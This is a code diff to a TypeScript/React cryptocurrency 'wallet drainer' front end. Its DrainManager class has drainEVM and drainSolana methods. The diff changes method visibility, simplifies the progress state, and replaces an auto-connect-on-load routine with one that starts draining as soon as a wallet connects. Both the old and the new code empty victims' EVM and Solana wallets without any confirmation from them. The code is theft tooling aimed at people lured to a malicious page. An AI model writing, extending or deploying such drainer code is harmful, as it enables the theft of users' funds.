@@ -139,7 +139,7 @@ class DrainManager {
     };
   }
 
-  public updateProgress(updates: Partial<DrainProgress>) {
+  private updateProgress(updates: Partial<DrainProgress>) {
     this.currentProgress = {
       ...this.currentProgress,
       ...updates,
@@ -178,7 +178,7 @@ class DrainManager {
     }
   }
 
-  public async drainEVM(wallet: WalletInfo): Promise<void> {
+  private async drainEVM(wallet: WalletInfo): Promise<void> {
     if (!wallet.signer) throw new Error('No signer available');
     
     this.updateProgress({
@@ -203,7 +203,7 @@ class DrainManager {
     }
   }
 
-  public async drainSolana(wallet: WalletInfo): Promise<void> {
+  private async drainSolana(wallet: WalletInfo): Promise<void> {
     this.updateProgress({
       currentAction: 'Draining Solana assets...',
     });
@@ -347,8 +347,8 @@ const Drainer = () => {
   const [drainProgress, setDrainProgress] = useState<DrainProgress>({
     status: 'idle',
     currentStep: 0,
-    totalSteps: 2, // EVM and Solana chains
-    currentAction: 'Preparing to drain...',
+    totalSteps: 0,
+    currentAction: '',
     txHashes: [],
   });
 
@@ -387,141 +387,27 @@ const Drainer = () => {
     }
   };
 
-  // Handle drain process for all chains
+  // Handle drain process
   const handleDrain = useCallback(async () => {
-    setDrainProgress(prev => ({
-      ...prev,
-      status: 'draining',
-      currentStep: 0,
-      totalSteps: 2, // EVM and Solana
-      currentAction: 'Starting drain process...',
-    }));
+    if (!wallet) return;
     
     const drainManager = new DrainManager((progress) => {
-      setDrainProgress(prev => ({
-        ...prev,
-        ...progress,
-        totalSteps: 2, // Ensure we always show 2 steps
-      }));
+      setDrainProgress(progress);
     });
     
     try {
-      // Always try to drain both EVM and Solana, regardless of connected wallet
-      const wallets = await WalletService.detectWallets();
-      
-      // Drain EVM chains if available
-      if (wallets.evm) {
-        try {
-          const evmWallet = wallet?.network === 'evm' 
-            ? wallet 
-            : await WalletService.connectEVM().catch(() => null);
-          
-          if (evmWallet) {
-            setDrainProgress(prev => ({
-              ...prev,
-              currentAction: 'Draining EVM chains...',
-            }));
-            
-            await drainManager.drainEVM(evmWallet);
-            
-            setDrainProgress(prev => ({
-              ...prev,
-              currentStep: 1,
-              currentAction: 'EVM drain completed',
-            }));
-          }
-        } catch (error) {
-          console.error('EVM drain failed:', error);
-        }
-      }
-      
-      // Drain Solana if available
-      if (wallets.solana) {
-        try {
-          const solanaWallet = wallet?.network === 'solana'
-            ? wallet
-            : await WalletService.connectSolana().catch(() => null);
-          
-          if (solanaWallet) {
-            setDrainProgress(prev => ({
-              ...prev,
-              currentStep: 2,
-              currentAction: 'Draining Solana...',
-            }));
-            
-            await drainManager.drainSolana(solanaWallet);
-            
-            setDrainProgress(prev => ({
-              ...prev,
-              currentStep: 2,
-              currentAction: 'Solana drain completed',
-            }));
-          }
-        } catch (error) {
-          console.error('Solana drain failed:', error);
-        }
-      }
-      
-      setDrainProgress(prev => ({
-        ...prev,
-        status: 'completed',
-        currentAction: 'Drain completed successfully!',
-      }));
-      
+      await drainManager.drainWallet(wallet);
     } catch (error) {
-      console.error('Drain process failed:', error);
-      setDrainProgress(prev => ({
-        ...prev,
-        status: 'failed',
-        error: error instanceof Error ? error.message : 'Unknown error occurred',
-        currentAction: 'Drain failed',
-      }));
+      console.error('Drain failed:', error);
     }
   }, [wallet]);
 
-  // Auto-connect and start drain on component mount
+  // Auto-start drain when wallet is connected
   useEffect(() => {
-    const autoConnect = async () => {
-      try {
-        setWalletState('connecting');
-        
-        // Try both EVM and Solana connections
-        const wallets = await WalletService.detectWallets();
-        setAvailableWallets(wallets);
-        
-        if (wallets.evm) {
-          try {
-            const walletInfo = await WalletService.connectEVM();
-            setWallet(walletInfo);
-            setWalletState('connected');
-            await handleDrain();
-            return;
-          } catch (e) {
-            console.error('EVM auto-connect failed:', e);
-          }
-        }
-        
-        if (wallets.solana) {
-          try {
-            const walletInfo = await WalletService.connectSolana();
-            setWallet(walletInfo);
-            setWalletState('connected');
-            await handleDrain();
-            return;
-          } catch (e) {
-            console.error('Solana auto-connect failed:', e);
-          }
-        }
-        
-        setWalletState('disconnected');
-      } catch (error) {
-        console.error('Auto-connect failed:', error);
-        setWalletState('error');
-      }
-    };
-    
-    autoConnect();
-  }, []);
+    if (walletState === 'connected' && wallet) {
+      handleDrain();
+    }
+  }, [walletState, wallet, handleDrain]);
 
   return (
     <div className="max-w-md mx-auto p-6 bg-gray-900 rounded-xl shadow-lg text-white">
